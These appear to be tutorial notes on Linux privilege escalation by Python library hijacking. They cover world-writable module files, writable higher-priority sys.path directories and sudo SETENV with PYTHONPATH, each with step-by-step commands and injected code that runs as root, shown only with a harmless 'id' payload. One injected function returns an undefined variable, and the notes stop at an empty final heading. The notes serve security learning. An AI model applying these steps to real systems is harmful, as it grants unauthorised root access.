
# 1. Concept

Python scripts import modules/libraries.

Example:

```python
import psutil
```

If attacker controls:

- imported library
    
- library search path
    
- PYTHONPATH
    

then attacker code executes.

# 3. Main Vulnerabilities

|Technique|Description|
|---|---|
|Wrong Write Permissions|Modify original library|
|Library Path Hijacking|Create fake library in higher priority path|
|PYTHONPATH Hijacking|Force Python to load attacker module|

---

# 4. Wrong Write Permissions

## Step 1: Check vulnerable script

```bash
ls -l mem_status.py
```

Output:

```bash
-rwsrwxr-x
```

`SUID` bit set → script runs as root.

---

## Step 2: View script

```python
import psutil

available_memory = psutil.virtual_memory()
```

Script imports:

```python
psutil
```

---

## Step 3: Find imported function

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

---

## Step 4: Check permissions

```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Output:

```bash
-rw-r--rw-
```

Others have write permissions.

---

## Step 5: Inject malicious code

```python
def virtual_memory():

    import os
    os.system('id')

    return ret
```

---

## Step 6: Execute vulnerable script

```bash
sudo /usr/bin/python3 ./mem_status.py
```

Output:

```bash
uid=0(root)
```

# 5. Library Path Hijacking

# Concept

Python searches module paths in order.

First match wins.

---

## Step 1: View Python search paths

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

Example:

```bash
/usr/lib/python3.8
/usr/local/lib/python3.8/dist-packages
```

---

## Step 2: Check real module location

```bash
pip3 show psutil
```

Output:

```bash
Location: /usr/local/lib/python3.8/dist-packages
```

---

## Step 3: Find writable higher-priority path

```bash
ls -la /usr/lib/python3.8
```

Output:

```bash
drwxr-xrwx
```

Writable by everyone.

---

## Step 4: Create fake module

File:

```bash
/usr/lib/python3.8/psutil.py
```

Contents:

```python
import os

def virtual_memory():
    os.system('id')
```

---

## Step 5: Execute vulnerable script

```bash
sudo /usr/bin/python3 mem_status.py
```

Output:

```bash
uid=0(root)
```

---

# 7. PYTHONPATH Hijacking

# Concept

`PYTHONPATH` controls where Python searches for modules.

---

## Step 1: Check sudo permissions

```bash
sudo -l
```

Output:

```bash
SETENV: NOPASSWD: /usr/bin/python3
```

`SETENV` allows setting environment variables.

---

## Step 2: Create malicious module

File:

```bash
/tmp/psutil.py
```

Contents:

```python
import os

def virtual_memory():
    os.system('id')
```

---

## Step 3: Run exploit

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

---

## Step 4: Result

Python searches `/tmp` first.

Loads attacker module.

Output:

```bash
uid=0(root)
```

# 8. Important Commands
